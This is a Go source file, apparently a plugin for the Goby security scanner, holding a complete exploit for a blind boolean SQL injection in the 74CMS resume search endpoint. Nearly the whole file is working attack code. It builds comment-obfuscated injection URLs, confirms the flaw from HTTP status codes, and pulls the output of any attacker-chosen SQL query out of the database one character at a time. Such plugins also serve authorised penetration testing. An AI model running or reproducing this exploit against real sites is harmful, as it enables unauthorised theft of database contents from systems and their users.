package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "74CMS Resume.php Boolean SQLI",
    "Description": "74CMS ",
    "Product": "74CMS",
    "Homepage": "http://www.74cms.com/",
    "DisclosureDate": "2021-06-05",
    "Author": "834714370@qq.com",
    "GobyQuery": "app=\"Knight-74CMS\"",
    "Level": "3",
    "Impact": "<p>74CMS &lt;= v2.2.0 has SQL injection vulnerability. Attackers can use the vulnerability to obtain sensitive information</p>",
    "Recommendation": "",
    "References": [
        "http://www.74cms.com/downloadse/load/id/33.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Target",
            "type": "input",
            "value": "select database()"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "SQL Injection"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10201"
}`
	doGet := func(url string, code int, checkBody bool) bool {
		if resp, err := httpclient.SimpleGet(url); err == nil {
			if checkBody {
				return strings.Contains(resp.Utf8Html, "错误，请联系管理员") || strings.Contains(resp.Utf8Html, "The SQL being executed") || resp.StatusCode == code
			} else if resp.StatusCode == code {
				return true
			}
			return false
		}
		return false
	}

	replace := func(str string, format string, target string) string {
		return strings.Replace(str, format, target, 1)
	}

	exploit := func(url string) int {
		xx := 128
		xs := 1

		for {
			x := (xx + xs) / 2
			payload := replace(url, "{{{X}}}", strconv.Itoa(x))
			if xx == xs || xx-xs == 1 {
				break
			}
			if !doGet(payload, 500, false) {
				xx = x
			} else {
				xs = x
			}
		}

		return xs
	}

	blasting := func(url string, length int) string {
		result := ""
		for i := 1; i <= length; i++ {
			result += string(exploit(replace(url, "{{{LEN}}}", strconv.Itoa(i))))
		}
		return result
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			vulnUrl := u.FixedHostInfo + "/index.php/v1_0/home/Resume/index?keyword=123'/**/IN/**/NATURAL/**/LANGUAGE/**/MODE)/**/FROM/**/qs_resume_search_key/**/a/**/union/**/select/**/1,2,3,4,5,6/**/from/**/dual/**/where/**/1=(SELECT/**/(CASE/**/1/**/WHEN/**/{{{TARGET}}}/**/THEN/**/(select/**/1/**/from/**/mysql.user)/**/ELSE/**/1/**/END))%23"
			if doGet(replace(vulnUrl, "{{{TARGET}}}", "99"), 200, false) {
				if doGet(replace(vulnUrl, "{{{TARGET}}}", "1"), 500, false) {
					return true
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			target := ss.Params["Target"].(string)
			target = url.QueryEscape(target)

			host := expResult.HostInfo.FixedHostInfo + "/index.php/v1_0/home/Resume/index?keyword=123'/**/IN/**/NATURAL/**/LANGUAGE/**/MODE)/**/FROM/**/qs_resume_search_key/**/a/**/union/**/select/**/1,2,3,4,5,6/**/from/**/dual/**/where/**/1="
			template := host + "(SELECT/**/(CASE/**/WHEN/**/(length(({{{TARGET}}}))>={{{X}}})/**/THEN/**/(select/**/1/**/from/**/mysql.user)/**/ELSE/**/1/**/END))%23"
			length := exploit(strings.Replace(template, "{{{TARGET}}}", target, 1))

			if length > 0 {
				template1 := host + "(SELECT/**/(CASE/**/WHEN/**/(ord(mid(({{{TARGET}}})from({{{LEN}}})for(1))))>={{{X}}}/**/THEN/**/(select/**/1/**/from/**/mysql.user)/**/ELSE/**/1/**/END))%23"
				template1 = strings.Replace(template1, "{{{TARGET}}}", target, 1)

				result := blasting(template1, length)

				if len(result) == length {
					expResult.Success = true
					expResult.Output = result
				}

			}
			return expResult
		},
	))
}
